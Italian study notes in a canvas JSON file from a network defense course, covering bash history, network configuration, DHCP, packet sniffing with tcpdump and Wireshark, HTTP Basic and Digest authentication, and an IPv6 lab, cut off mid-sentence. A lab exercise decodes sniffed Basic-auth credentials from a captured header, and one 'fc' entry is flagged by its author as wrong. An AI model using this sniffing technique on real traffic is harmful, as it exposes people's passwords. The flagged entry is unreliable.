		{"id":"6c0d3669627386fe","type":"text","text":"# Comandi `fc` (`fix command`) & `history`\n\nCome detto, la `shell` ha una memoria temporanea di quello che fai e ti permette di giocare con i comandi che hai già eseguito. Questo include modificarli e cancellarli.\n\nIl comando `history` ti fa accedere alla lista di comandi eseguiti, ma può fare molto di più:\n\n- `-N` - Mostra gli ultimi `N` comandi\n- `-d N` - Cancella il comando `N` dalla memoria temporanea;\n\t- \"Perché continui a dire temporanea? La mia shell si ricorda quello che faccio tra una sessione e l'altra!\". Sì, ma solo perché quando la chiudi copia la sua memoria volatile su `~/.bash_history`. Infatti se apri multiple `shell` avrai notato che la volta dopo molti comandi sembrano svaniti, perché solo l'ultima `shell` che chiudi scrive sul file di log.\n- `-c` - Cancella tutta la memoria temporanea;\n- `-w` - Scrive la `history` attuale sul file `~/.bash_history` (simile a `-r`, `reload`);\n\nMa oltre a cancellare quello che ho fatto posso anche correggerlo? Sì. `fc` (`fix command`) serve per ***modificare e rieseguire*** comandi precedenti della `history`. Questo comando è molto potente, da usare con cautela.\n\n- `fc 100` - Apre i comandi dalla `history` da `100` a `103` NO FALSO NON HO CAPITO COME FUNZIONA\n- `-l` Elenca i comandi, **senza eseguirli** e **senza aprire l’editor**.\n- `-n` - Usata con `-l`: **non stampa i numeri** della history.\n- `-r` - Inverte l’ordine dell’elenco (utile con `-l`).\n- `-e editor` - Specifica quale editor usare, es: `fc -e nano`.","x":-4160,"y":1008,"width":759,"height":894,"color":"3"},
		{"id":"f031ccc9198bb3ef","type":"text","text":"# ACME?","x":-2560,"y":7535,"width":759,"height":829,"color":"6"},
		{"id":"279048b2ffd901e7","type":"text","text":"\n| Sintassi          | Descrizione                                                           |\n| ----------------- | --------------------------------------------------------------------- |\n| `${VAR:-default}` | Se `VAR` è vuota o non esiste, usa `\"default\"` **ma non la assegna**. |\n| `${VAR:=default}` | Se `VAR` è vuota o non esiste, le assegna `\"default\"`.                |\n|                   |                                                                       |\n\n\n```bash\necho ${USER:-guest}   # Se USER non esiste, stampa \"guest\"\necho ${HOME:=/tmp}    # Se HOME non è settata, la assegna a \"/tmp\"\n```\n\n---\n\n| Sintassi                              | Descrizione                                 |\n| ------------------------------------- | ------------------------------------------- |\n| `${VAR:?Errore, VAR non è impostata}` | Se `VAR` non esiste, stampa errore ed esce. |\n|                                       |                                             |\n```bash\necho ${CONFIG_PATH:?Errore, variabile non settata!}\n```\n\nSe `CONFIG_PATH` è vuota, Bash stamperà\n\n```bash\nbash: CONFIG_PATH: Errore, variabile non settata!\n```\n\nUtile per script che richiedono variabili obbligatorie.\n\n---\n\n### Substringing e Sostituzioni Avanzate\n\n|Sintassi|Descrizione|\n|---|---|\n|`${VAR:0:5}`|Estrae una sottostringa: primi `5` caratteri.|\n|`${VAR//o/X}`|Sostituisce **tutti** gli \"o\" con \"X\".|\n|`${VAR/#Hello/Hi}`|Sostituisce `\"Hello\"` **all'inizio** con `\"Hi\"`.|\n|`${VAR/%World/Everyone}`|Sostituisce `\"World\"` **alla fine** con `\"Everyone\"`.|\n\n```bash\nVAR=\"HelloWorld\"\n\necho ${VAR:0:5}    # → \"Hello\"\necho ${VAR//o/X}   # → \"HellXWXrld\"\necho ${VAR/#Hello/Hi}  # → \"HiWorld\"\necho ${VAR/%World/Everyone}  # → \"HelloEveryone\"\n```","x":-3234,"y":2480,"width":759,"height":1079},
		{"id":"1277687575074913","type":"text","text":"`nmcli` e `netplan` sono **strumenti di configurazione della rete su Linux**, ma servono a scopi diversi e si usano in contesti diversi.\n\n---\n\n### ✅ **`nmcli` (NetworkManager Command Line Interface)**\n\n- È l’interfaccia **a riga di comando** per **NetworkManager**\n    \n- NetworkManager è un **demone** che gestisce in automatico le connessioni di rete (wired, wireless, VPN, ecc.)\n    \n- `nmcli` permette di:\n    \n    - Creare, modificare, eliminare connessioni\n        \n    - Connettersi a WiFi\n        \n    - Visualizzare lo stato della rete\n        \n    - Attivare/disattivare interfacce\n        \n\n📌 Tipico di desktop Ubuntu/Fedora o di sistemi dove NetworkManager è installato.\n\n#### Esempio:\n\n```bash\nnmcli dev wifi list\nnmcli con add type ethernet ifname eth0 ip4 192.168.1.10/24\n```\n\n---\n\n### ✅ **`netplan`**\n\n- È un sistema di **configurazione statica della rete basato su file YAML**\n    \n- Usato principalmente su **Ubuntu Server (da 17.10 in poi)**\n    \n- È un layer _frontend_ che genera configurazioni per:\n    \n    - **systemd-networkd**\n        \n    - o **NetworkManager**\n        \n\n📌 Si configura modificando `/etc/netplan/*.yaml`  \ne applicando con:\n\n```bash\nsudo netplan apply\n```\n\n#### Esempio file `/etc/netplan/01-netcfg.yaml`:\n\n```yaml\nnetwork:\n  version: 2\n  ethernets:\n    eth0:\n      dhcp4: false\n      addresses: [192.168.1.100/24]\n      gateway4: 192.168.1.1\n      nameservers:\n        addresses: [8.8.8.8]\n```\n\n---\n\n### 🔄 Confronto rapido\n\n|Caratteristica|`nmcli`|`netplan`|\n|---|---|---|\n|Interfaccia|CLI interattiva|Configurazione via YAML|\n|Backend|NetworkManager|systemd-networkd / NetworkManager|\n|Usato tipicamente|Desktop Linux|Ubuntu Server|\n|Modalità|Dinamico|Statico o semi-statico|\n\nVuoi sapere quale usare nel tuo caso?","x":-13520,"y":5217,"width":759,"height":1610},
		{"id":"00e1134b8cb7260f","type":"text","text":"# Varie Comandi\n\n\nCambiare il font dei terminali:\n\n- `nano ~/.Xresources` e aggiungi\n\t- `xterm*faceName: Monospace`\n\t- `xterm*faceSize: 12`\n\t- `/home/user/.Xresources (END)`\n- Salva, poi su terminale `xrdb -merge ~/.Xresources`.\n\n\n\n\n\nper riprendere l'esecuzione di un processo stoppato (CTRL+Z):\n\n- `fg` - torna ad essere eseguito in foreground (attivo nel terminale);\n- `bg` - torna ad essere eseguito in background.\n\t- ha lo stesso effetto di `&` a fine comando\n","x":-12601,"y":5217,"width":759,"height":410},
		{"id":"52efa23b596ae1eb","type":"file","file":"DigestAuthenticationSniffing.png","x":-12601,"y":11918,"width":759,"height":270},
		{"id":"ca3cf448e10d4a7f","type":"file","file":"BasicAuthenticationSniffing.png","x":-12601,"y":11545,"width":757,"height":138},
		{"id":"58ca04dd8eff3556","type":"text","text":"# Flussi `HTTP` per l'`ex4`\n\nSeguendo il flusso `HTTP` creo un Display Filter visibile in alto che segue lo stream.\n\n```http\nGET /ba.php HTTP/1.1\nHost: 10.0.0.1\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\nAuthorization: Basic YW5nZWxvOmFuZ3Nw\n\nHTTP/1.1 200 OK\nDate: Sun, 11 May 2025 11:42:09 GMT\nServer: Apache/2.4.62 (Debian)\nVary: Accept-Encoding\nContent-Encoding: gzip\nContent-Length: 186\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html; charset=UTF-8\n\n<html><p>Welcome angelo.</p><p>You entered the right password.</p><script>\necc..\n```\n\nNota che ci vuole poco ad eseguire `echo \"YW5nZWxvOmFuZ3Nw\" | base64 -d` ottenendo le credenziali in chiaro `angelo:angsp`. Lo fa addirittura `Wireshark` in automatico, se si ispeziona il campo `Authorization` della `GET` in basso a sinistra.\n\nCon Digest Access abbiamo invece un paio di campi diversi:\n\n```http\nCookie: login=True\nAuthorization: Digest username=\"angelo\", realm=\"Practical Network Defense - Sapienza\", nonce=\"6820908f7e06f\", uri=\"/da.php\", response=\"7260861f7b5869a9d1e2b3c1a3cb515a\", opaque=\"4de400b4078c41f5985fae0ffb6511cc\", qop=auth, nc=00000001, cnonce=\"fa342f2c9fc532aa\"\n```\nOvviamente questo manda l'username in chiaro, il che non ci piace molto.","x":-11592,"y":11248,"width":759,"height":1105,"color":"4"},
		{"id":"ff11c4fc000aa802","type":"text","text":"# SPACING","x":-13560,"y":11448,"width":250,"height":235,"color":"5"},
		{"id":"cb14f5abb112f7a1","type":"text","text":"# DHCPv4 (Reti)\n\nInizialmente gli IP erano statici, quindi *hard-coded* sull'host ad opera dell'admin di rete (e.g. da `/etc/rc.config` su UNIX). Questo approccio manuale è obsoleto, ormai IP è dinamico.\n\nSi usa invece un ***protocollo Applicazione*** basato su UDP, ***DHCP*** (***Dynamic Host Configuration Protocol***). L'idea generale degli indirizzi IP è che vengano *presi in prestito*. La gestione di questi *leasing* sta al ***server DHCP***, spesso integrato nei router domestici.\n\n- Cerco un server DHCP mandando una ***DHCP discover***, in cui specifico\n\t- **Sorgente** - `0.0.0.0` (\"non ho un IP\") `68` (standard lato client per DHCP);\n\t- **Destinazione** - `255.255.255.255 67` broadcast sulla 67 (standard lato server);\n\t- `Requested IP Address` - Eventualmente posso specificare l'IP che vorrei avere tra le opzioni facoltative. `0.0.0.0` significa \"boh, fai tu\";\n\t- **Transaction ID** - Dato che gli host non hanno ancora un IP, tutti i messaggi DHCP vengono mandati broadcast. Questo valore viene scelto in modo casuale e assicura che non possano esserci conflitti.\n- Il server DHCP vede il messaggio di `discover` e risponde con una ***DHCP Offer***:\n\t- **Sorgente** - `223.1.2.5 67`, \"sono il server DHCP, mi chiamo `Server Identifier`\";\n\t- **Destinazione** - `255.255.255.255 68` (broadcast, il client non ha ancora un IP);\n\t- `yiaddr` - `223.1.2.4` (\"ti propongo questo IP\");\n\t- **Transaction ID** - Devo specificare a chi sto rispondendo;\n\t- **Lifetime** - Specifica quanto dura il leasing (e.g. `3600`, \"questo IP dura un'ora\");\n- Se il client aveva già un indirizzo IP e vuole conservarlo salto questi primi due step;\n- A questo punto il client ha una proposta di IP. Chiede al server se può usarlo con una ***DHCP Request***. I campi sono gli stessi di una discovery (il tipo di richiesta è specificato con l'`opzione 53 (DHCP Message Type`), il `Requested IP Address` (`opzione 50`) è quello dell'Offerta DHCP o il mio vecchio IP;\n\t- Anche la Request è broadcast, perché devo scegliere un solo server e comunicare ad altri eventuali server che hanno risposto con una Offer che il loro IP non verrà usato. Lo faccio tramite l'`opzione 54 (Server Identifier)`;\n- Finalmente, il server DHCP scelto dal client conferma l'IP con un messaggio ***DHCP ACK***.\n\t- Se però ho richiesto un IP non valido o non disponibile, il server risponderà con un messaggio ***DHCP NAK***, che in pratica mi costringe a ripetere tutta la procedura.\n\nOltre a ciò, il server DHCP fornisce gli IP del gateway, di un server DNS e la subnet mask.","x":-10583,"y":9920,"width":759,"height":1105,"color":"4"},
		{"id":"e0222f3875abd212","type":"text","text":"# Wireshark & Deep Packet Inspection (DPI)\n\nWireshark sfrutta `dumpcap` e i ***BPF*** (***capture filters***) per fare packet sniffing, dopodiché vi costruisce al di sopra una potente analisi dati. Ciò include tutto ciò che fa già `tcpdump` (i.e. interpretazione degli header), ma aggiunge svariati altri layer di decodifica.\n\n- ***Riassemblaggio IP*** - Ricostruisco i pacchetti `IP` frammentati per avere payload \"interi\";\n\t- Se si utilizza `IPsec`, il \"vero\" `header IP` è crittato insieme al resto del messaggio. In ogni caso, l'`header` di `IPsec` stesso deve comunque essere in chiaro.\n- ***Riassemblaggio TCP*** - Di norma l'`header` di Trasporto è in chiaro. Posso quindi capire se sotto `IP` c'è una connessione `TCP`, e in caso ricostruirne il flusso. Wireshark simula quindi un client `TCP`, perché riordina i segmenti (e.g. ritrasmissioni, ricezioni out-of-order) e distingue le varie connessioni. Alla fine di questa fase ottengo una \"full picture\" di chi parla con chi;\n- ***Decrittazione*** (***Opzionale***) - A questo punto c'è il problema ***TLS***, i.e. il payload potrebbe essere crittato. Se sono in possesso di chiavi (cosa tutt'altro che scontata), qui posso decodificare il contenuto dei segmenti riassemblati;\n- ***Deep Packet Inspection*** - Qui usiamo i ***dissectors***, i.e. pezzi di SW che guardano la porta di destinazione e leggono l'`header` Applicazione che segue assumendo sia quello del protocollo standard su quella porta (e.g. una connessione sulla porta `80` verrà interpretata in automatico come protocollo `HTTP`).\n\t- Ovviamente questa cosa è stupida, nel senso che posso connettermi sulla porta `80` in `SSH`, o qualsiasi altro protocollo. Wireshark proverà comunque ad interpretare con il protocollo standard, a meno che dall'alto qualcuno non gli dica \"`leggi la roba sulla porta 80 come se fosse SSH`\";\n\t- Su porte non standard può usare delle ***euristiche*** per inferire il protocollo;\n\t- Questa cosa ovviamente è più facile se la connessione è in chiaro o se avevo le chiavi, un po' meno altrimenti. Se c'è un layer di crittografia, posso vedere solo l'`header TLS`. Se sono fortunato e becco l'***handshake*** posso vedere i protocolli supportati dal client (messaggio di `ClientHello`) e/o quello scelto dal server (con la risposta, `ServerHello`), altrimenti ho solo la versione di `TLS`. Il resto del payload è comunque crittato, e risulterà genericamente come `Application Data`.\n\nA questo punto Wireshark ha tutto il necessario per implementare\n\n- ***Analisi Esperta*** - Calcolo di statistiche aggregate (e.g. protocolli applicazione più usati, ma anche grafici, gerarchie di protocolli e tempi di risposta) ed anomalie. Se i dati sono crittati, si limita ad errori di riassemblaggio `IP` e `TCP`;\n- ***Estrazione di Oggetti*** - Se i payload trasportano dati relativi a file, questo modulo li scarica. Ovviamente se i dati sono crittati sta roba non funziona;\n- ***Display Filters*** - Lo strato finale che permette di interagire con le informazioni raccolte. Posso scegliere di visualizzare solo i dati di un certo tipo (e.g. `http.request.uri`), a patto ovviamente che Wireshark sia stato in grado di risolvere o decrittare quello specifico `header` (e.g. `tls.handshake.type` sarà sempre in chiaro).","x":-8061,"y":9920,"width":759,"height":1105,"color":"4"},
		{"id":"780a7728bf920c66","type":"text","text":"# Packet Sniffing\n\nDi norma, una NIC scarta tutti i pacchetti che non sono diretti al suo `MAC Address`. Questi pacchetti \"validi\" vengono quindi mandati al modulo del `kernel` che implementa le funzioni della stack TCP/IP. Qui si scarta la carta fino al livello di trasporto, e il risultato viene mandato al giusto socket `AF_INET` (e.g. un socket UDP).\n\nPosso però ordinare alla NIC di non scartare i pacchetti destinati agli altri, impostandola in ***promiscuous mode*** tramite il suo driver (lo scarto avviene a livello HW). Questo però di per sé non cambia molto, perché il `kernel` decapsula e non trova nessun socket `(IP, porta)` che corrisponde (banalmente, l'`IP` non è il tuo).\n\nLa soluzione è aprire un socket `AF_PACKET` tra la NIC e il `kernel`, che quindi riceve i dati grezzi Ethernet prima che questi vengano spacchettati.\n\nLe funzioni per realizzare tutto questo sono scritte in `C` nella libreria `libpcap`. Tramite le sue API, un processo può realizzare la cattura dei pacchetti. Ciò avviene in\n\n- `dumpcap`, che si limita a salvare i dati grezzi in un file `.pcap`;\n- `tcpdump`, che fa anche la ***decodifica*** e stampa su terminale.\n\n***Wireshark*** (o il uso equivalente CLI `tshark`) fornisce un potente sistema di decodifica (***Deep Packet Inspection***), filtraggio e interfaccia grafica appoggiandosi su `dumpcap`.\n\nPer analisi di più alto livello, SW come ***nfsen*** e ***Zeek*** producono dei quadri complessivi ad alto livello ed in tempo reale della situazione (e.g. chi parla con chi, quando e tramite cosa). ","x":-7052,"y":10155,"width":759,"height":635,"color":"6"},
		{"id":"9aab84f55bbcd7b5","type":"text","text":"# Prima Sniffing, poi Decodifica\n\nUn programma come `dumpcap` o `tcpdump` usa le API di `libpcap` per\n\n- Aprire un socket `AF_PACKET` che riceve frame Ethernet grezzi (`SOCK_RAW`) di tutti i possibili protocolli (`ETH_P_ALL`):\n```C\nsocket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));\n```\n- Attivare la `promiscuous mode` sulla NIC:\n```C\nioctl(sock, SIOCSIFFLAGS, ...);\n```\n- Creare una memoria condivisa ad anello (***ring buffer***) tra `kernel` e `user`, in modo da poter leggere in `user mode` quello che scrive il `kernel` senza passare per le `syscall`;\n- Implementare dei ***Berkeley Packet Filters*** (***BPF***), i.e. limitare i pacchetti che il `kernel` scrive nel `ring buffer` (e.g. `tcpdump 'tcp port 80'` passa la stringa-filtro al `kernel`, il quale legge gli header per applicarlo). I pacchetti esclusi dai BPF vengono persi.\n\nPer quanto detto, un processo di ***sniffing*** è un'invocazione del tipo\n\n```bash\ndumpcap -i eth0 -w cattura.pcap\n```\n\nche scrive sul file `cattura.pcap` i dati Ethernet grezzi ricevuti dall'interfaccia `eth0`.\n\nI dati così ottenuti sono però degli ***hexdump*** (o meglio, file binari strutturati che vengono poi letti ed interpretati come hexdump). Qui `dumpcap` si ferma, mentre `tcpdump` va avanti. Se voglio capire cosa sto guardando ad alto livello devo ***decodificare*** il pacchetto, ed è a questo punto che entrano in gioco le strutture degli ***header***. Ognuno di essi mi dà informazioni su cosa c'è dopo (in particolare su dove si trova l'header successivo), oltre ovviamente a via via tutte le informazioni sul pacchetto.\n\n- ***Ethernet*** - Qui posso guardare `src` e `dst` (`MAC`), mentre `ethertype` mi dice cosa c'è nel payload (e.g. `0x0800` è in `IPv4`, `0x0806` è `ARP`);\n- ***IP*** - Indirizzi `IP` di `src` e `dst`, inoltre il campo `protocol` mi dice cosa aspettarmi per il livello di Trasporto (e.g. `protocol = 6` significa TCP);\n- ***Trasporto*** - Qua leggo le `porte` di `src` e `dst`, e in pratica ricostruisco il socket a cui è indirizzato il pacchetto;\n- ***Applicazione*** - Qui `tcpdump` inizia ad essere limitato, in quanto riesce ad interpretare solo alcuni protocolli, e spesso non del tutto (e.g. con `HTTP` si ferma alle intestazioni). Non è in grado di interpretare dati compressi o crittati (e.g. con ***TLS***).\n\n... quindi questo è tutto ciò che posso dire? No, posso fare molto di più. Il livello successivo è ***Wireshark***, che implementa la ***Deep Packet Inspection*** (***DPI***).","x":-6043,"y":9920,"width":759,"height":1105,"color":"4"},
		{"id":"20ce16025e72707f","type":"text","text":"# `tcpdump`\n\n```bash\ntcpdump [opzioni] [filtro BPF]\n```\n\nLe opzioni principali sono\n\n- `-i [interfaccia]` - Sceglie l'interfaccia da sniffare (e.g. `eth0`, `lo` per `loopback`);\n- `-c [N]` - Ferma la cattura dopo `N` pacchetti;\n- `-w [file]`, `-r [file]` - Scrive o legge un `file` in formato `.pcap`;\n- `-nm` - Non risolve i nomi, mostrando `IP` e `porte`;\n- `-v`, `-vv`, `-vvv` - Aumenta progressivamente la verbosità dell'output;\n- `-tt` - Mostra i timestamp assoluti;\n- `-X`, `-A` - Mostra anche i payload dei pacchetti, rispettivamente in `HEX` e in `ASCII`.\n\nI filtri principali sono invece\n\n- Per protocollo (e.g. `tcp`, `udp`, `icmp`, `ip6`);\n- Per porta (e.g. `port 80`);\n- Per host (e.g. host `192.168.1.1`);\n- Per sorgente/destinazione (e.g. `src port 22`).\n\nL'output ha ad esempio la seguente forma:\n\n- Timestamp (e.g. `12:34:56.789123`);\n- Protocollo di livello 3 (e.g. `IP`);\n- Sorgente.porta > Destinazione.porta (e.g. `192.168.1.2.443 > 192.168.1.100.53422:`);\n- Flags del protocollo di livello 4 (e.g. `Flags [P.]` sono le `flags Push` e `Ack` di `TCP`);\n- Seguono parametri opzionali se parliamo ad esempio di `TCP`:\n\t- Numeri di sequenza dei pacchetti (e.g. `seq 1234:1256`);\n\t- Numero di `Ack` (e.g. `ack 5678`);\n\t- Window Size (e.g. `win 501`);\n- Lunghezza dei payload (e.g. `length 22`, sottinteso `byte`).\n\nDiversi protocolli hanno ovviamente diversi formati di output, ad esempio abbiamo\n\n```bash\nARP, Request who-has 172.16.2.254 tell 172.16.2.2, length 28\n```\noppure\n\n```bash\nIP 172.16.2.2 > 172.16.2.254; ICMP echo request, id 9, seq 101, length 64\n```","x":-5034,"y":9920,"width":759,"height":1105,"color":"4"},
		{"id":"4aa8b654f9a7feaa","type":"text","text":"# `JavaScript`\n\nLo sto facendo solo perché `view-source:http://10.0.0.1/ba.php` dell'`ex4` restituisce\n```html\n<html>\n<p>Welcome angelo.</p>\n<p>You entered the right password.</p>\n<script>\n\tfunction logout() {\n\t\tdocument.cookie=\"login=False\";\n\t\tlocation.href = \"ba.php\"; }\n</script>\n<p><button onclick=\"logout()\">Log out</button></p></html>\n```\n\n(no dai, anche per capire meglio il source di Storm). Si tratta di codice eseguito\n\n- dai ***browser*** che lo supportano, tramite un ***engine integrato*** (***V8*** su ***Chrome***, `Edge` ed `Opera`, `SpiderMonkey` su `Firefox` e altri nomi su altri `browser`);\n\t- Le funzionalità qui includono modificare codice `HTML/CSS`, reagire ad azioni dell'utente (e.g. `onClick`), mandare richieste `HTTP` e gestire i `Cookies`.\n- dal ***server*** tramite ***Node.js*** (si basa su V8, ma gli aggiunge accesso a `memoria`, `filesystem` e altre cose che rendono `JavaScript` utile nel ***backend***).\n\nQuesta distinzione è importante. `JavaScript` include oggetti come `document` (che accede al ***DOM***, **Document Object Module**, i.e. una sorta di `filesystem` costruito dal `browser` a partire dal `documento html` o `xml`) e funzioni come `writeFileSync`, ma\n\n- sul server (i.e. `Node.js`) non c'è alcun DOM, quindi una chiamata a `document` fallisce;\n- sul browser non c'è alcun `filesystem` su cui scrivere un `file`, quindi la chiamata alla funzione `writeFileSync` fallisce.\n\nChiaramente posso usare il backend per simulare il browser tramite apposite librerie, per testare in locale il sito che sto costruendo. In sostanza, ciò che JavaScript può fare dipende molto dall'ambiente in cui viene eseguito.\n\nPer via della sua integrazione con `HTML/CSS`, `JavaScript` è praticamente l'unico linguaggio `browser` in circolazione, e \"sopra\" di esso sono stati costruiti diversi linguaggi, spesso per semplificarne la sintassi. Ne sono esempi `CoffeeScript`, `TypeScript` (Microsoft), `Flow` (Facebook), `Dart` (Google), `Bython` (sintassi `Python` tradotta in `JavaScript`) e `Kotlin`.\n\nTutto ciò è basato sull'introduzione a `Javascript` di [questo sito di tutorial](https://javascript.info/), dal quale in futuro probabilmente prenderò altra roba.","x":-11592,"y":9920,"width":759,"height":1105,"color":"6"},
		{"id":"676c67e7ed61abe7","type":"text","text":"# `HTTP` Authentication\n\nNelle fasi primordiali di `HTTP` qualcuno si è reso conto che chiunque poteva accedere ai contenuti di un server. Da qui le idee di:\n\n- Suddividere ed etichettare le varie \"zone\" riservate di un server, con i ***realm***;\n- Richiedere per ogni `realm` un'***autenticazione*** con `username` e `password`.\n\nCome gestisco il processo di autenticazione?\n\n- ***Basic Authentication*** - Codifico con `Base64` la stringa `username:password` e la invio come campo dell'header (i.e. `Authorization: Basic base64(username:password)`);\n\t- Questa cosa ovviamente è una follia, perché ***manda continuamente tutto in chiaro*** (`base64` è una codifica, non una crittografia, i.e. è reversibile senza chiave). Chiunque intercetti un simile pacchetto può tranquillamente risalire a tutti i dati;\n\t- Non essendo previsti `nonce` o challenge, è vulnerabile ad ***attacchi replay***;\n\t- Diventa accettabile con `HTTPS` (che comunque non risolve il replay) o entro una rete privata in cui la sicurezza non è così importante;\n\t- Dalla cattura con `Wireshark` per `lab1 ex4` notiamo come lo scambio di dati sia molto rapido: `handshaking TCP`, `GET`, `200 OK` e chiusura della connessione.\n- ***Digest Authentication*** - La versione migliorata di Basic, che introduce i ***nonce***. Il client è \"costretto\" ad un primo messaggio esplorativo, al quale il server risponderà con un codice `401 Unauthoized` e la challenge \"`ecco un nonce (e.g. abc123), ora tu lo concateni alla password e applichi questa funzione di hash (e.g. MD5)`\".\n\t- La richiesta `Digest` del client, oltre alle cose ovvie, include l'`hash` complessivo (chiamato `response`), un valore `opaque` usato dal `server` per associare il `client` ad una sessione e che il `client` deve restituire identico, `qop` che indica la `Quality of Protection` (`auth` per crittare solo le credenziali, `auth-int` per l'`integrity`, i.e. per crittare anche il contenuto del `payload`), il `nonce count nc`, i.e. quante volte ho usato questo `nonce` e un `client nonce cnonce` usato solo dal client come protezione agli attacchi replay;\n\t- Non manda password in chiaro, né è vulnerabile ad attacchi replay (ad ogni richiesta cambia il `nonce`, quindi l'`hash`);\n\t- Più complicato e a volte mal supportato dai browser;\n\t- Tutto questo comunque protegge solo l'autenticazione, non il contenuto. È sempre preferibile usarlo con ***TLS***;\n\t- Dalla cattura con `Wireshark` per `lab1 ex4` notiamo come lo scambio di dati sia più lungo: anzitutto riceviamo un `401 Unauthorized`, la connessione viene chiusa e poi riaperta dal client quando invia la `password` protetta dalla challenge.","x":-10583,"y":11248,"width":759,"height":1105,"color":"4"},
		{"id":"a9d3163314090aa4","type":"text","text":"# Laboratorio 2 - `IPv6`\n\n### `Ex1`\n\nL'assegnazione statica è identica ad `IPv4` (le uniche differenze sono `inet > inet6` e `ip route > ip route -6`) . Posso provare a mandare i `ping` anche sul `Link Local`, ma dal momento che iniziano tutti per `fe80::` (qualsiasi sia il collegamento fisico a cui fanno riferimento) devo sempre specificare l'interfaccia, e.g. `ping fe80::7072:453f:1253:2245%eth0`. Anche qui, con packet sniffing si possono osservare i meccanismi di `Solicitation` che sostituiscono `ARP`.\n\n### `Ex2`\n\nPer usare SLAAC è necessario mandare i messaggi di `RA`. Linux non ha tool interni per fare da `router IPv6`, quindi bisogna usarne uno esterno: `radvd` (i.e. `Router Advertisement Daemon`), che come ogni programma ha un file di configurazione (e.g. `/etc/radvd.conf` o `/etc/radvd.d`) per specificare per ogni interfaccia cose tipo ogni quanto mandare le `RA` o qual è il prefisso di rete. Basta eseguirlo con `radvd`, verrà demonizzato in automatico (i.e. andrà ni background e sarà indipendente dalla shell, posso evitare questa cosa con `-n`). Stessa cosa per `DHCPv6`, che non è supportato da `udhcpd`. Una prima alternativa sarebbe `dibbler`, ma \"è un po' obsoleto\", quindi usiamo `dnsmasq`, che fa anche da mini-server DNS.\n\nBene, con quale meccanismo generiamo gli indirizzi `IPv6` con SLAAC? In generale, sempre con `iface eth0 inet6 auto` in `/etc/network/interfaces.d/eth0` (`auto` = SLAAC) + `ifup eth0` per attivarla. Il risultato però cambia a seconda dei parametri di `sysctl`, seguiamo diversi approcci al variare del `pc`:\n\n1. Qui scrivo la roba su `interfaces` senza riflettere troppo, e mi dice bene perché di default il parametro `net.ipv6.conf.eth0.accept_ra` è settato al valore `2` (i.e. accetta le `RA` anche se `net.ipv4.ip_forward` è attivo), il che è strano. Di norma se inoltro i pacchetti sono un router, e nessuno dovrebbe venirmi a dire chi è la rete, perché la rete sono io! Insomma, per far funzionare questo banale `iface eth0 inet6 auto` + `ifup eth0` se quel parametro non fosse settato avrei due opzioni: settarlo personalmente a `2` e chissenefrega oppure a settarlo a `1` e disabilitare `net.ipv6.conf.eth0.forwarding`;\n\t- Se controllo con `ip a` appena avvio l'interfaccia potrei vedere un tag \"`tentative`\" in corrispondenza dell'indirizzo generato da SLAAC. Questo mi dice che non ha ancora fatto il controllo DAD, e se ricontrollo più tardi questo tag sparisce;\n\t- Nota che non sto specificando ***come*** SLAAC genera l'indirizzo, quindi userà il default di sistema. `cat /proc/sys/net/ipv6/conf/eth0/addr_gen_mode` restituisce `0`, quindi ci svela che ha usato EUI-64. Non bellissimo, nei prossimi `pc` faremo di meglio.\n2. Prima di `ifuppare` roba impostiamo `sysctl -w net.ipv6.conf.eth0.addr_gen_mode=3`, e forse a questo punto è utile capire cosa sono i vari valori:\n\t-  `0` - Usa EUI-64;\n\t- `1` - Usa EUI-64, ma non genera il `Link-Local` (non so bene a cosa possa essere utile). Il `kernel` potrebbe però crearlo da sé, se vuoi evitare che lo faccia devi dirgli anche `sysctl net.ipv6.conf.eth0.autoconf=0` e `sysctl net.ipv6.conf.eth0.accept_ra=0`. Vabbè;\n\t- `2` - Usa un indirizzo pseudocasuale generato a partire da uno `stable_secret` ([RFC 7217](https://datatracker.ietf.org/doc/html/rfc7217)), i.e. un parametro di `256 bit` usato in una funzione di hash (e.g. `HMAC-SHA256`) insieme al `network prefix` e all'interfaccia per sputare fuori un indirizzo che resta sempre uguale se sono connesso alla stessa rete sulla stessa interfaccia, ma che cambia appena modifico una delle due. Questo perché EUI-64 mi assegnerebbe lo stesso indirizzo statico in qualsiasi posto io sia connesso, costituendo di fatto un problema per la privacy;\n\t- `3` - Usa un indirizzo (pseudo)casuale come con il valore `2`, ma stavolta al posto di `stable_secret` uso valori casuali. Perfetto se sei ossessionato dall'idea che la CIA ti stia tracciando in giro per il mondo, un incubo per gli admin di rete che non hanno idea di chi sei.\n3. ... e qui tocca settare e usare `stable_secret`. Ne generiamo uno lungo `32 byte` (lo standard richiede una chiave ad entropia sufficientemente alta) con `openssl rand -hex 32 > /proc/sys/net/ipv6/conf/eth0/stable_secret`. Settiamo `sysctl -w net.ipv6.conf.eth0.addr_gen_mode=2`, il file `interfaces` come nostro solito et voilà (`ifup`);\n\t- Ovviamente questa cosa di generare uno `stable_secret` andrebbe fatta una sola volta, ma per motivi pratici lo mettiamo nei comandi di `startup`.\n4. Qui invece torniamo agli indirizzi EUI-64 ma usiamo anche quelli temporanei ([RFC 4941](https://datatracker.ietf.org/doc/html/rfc4941)).\n\t- Il parametro `use_tempaddr` offre come opzioni:\n\t\t- `0` - Disabilita gli indirizzi temporanei;\n\t\t- `1` - Aggiunge gli indirizzi temporanei in parallelo a quello stabile. Chiaramente quello da usare in questo caso;\n\t\t- `2` - Usa solo indirizzi temporanei, ignorando quello stabile.\n\t- Vi sono poi due parametri che definiscono i range di validità temporale di siffatti indirizzi:\n\t\t- `temp_valid_lft` definisce per quanto tempo l'indirizzo sarà ***valido***, i.e. accettato nei pacchetti in arrivo. Al termine di questo tempo l'indirizzo viene rimosso dall'interfaccia;\n\t\t- `temp_prefered_lft` definisce per quanto tempo l'indirizzo sarà ***preferito***, i.e. utilizzato per inviare pacchetti. Al termine di questo tempo l'indirizzo resta valido, ma non viene più usato come sorgente di nuove connessioni. Implicitamente mi dice anche ogni quanto generare un nuovo indirizzo temporaneo.\n\t- Impostare `user_tempaddr=1`, `temp_valid_lft=600` e `temp_prefered_lft=60` significa generare un nuovo indirizzo temporaneo ogni `60 secondi`, invalidando quelli vecchi dopo `10 minuti` dalla creazione. Segue che \"a regime\" avrò `7` 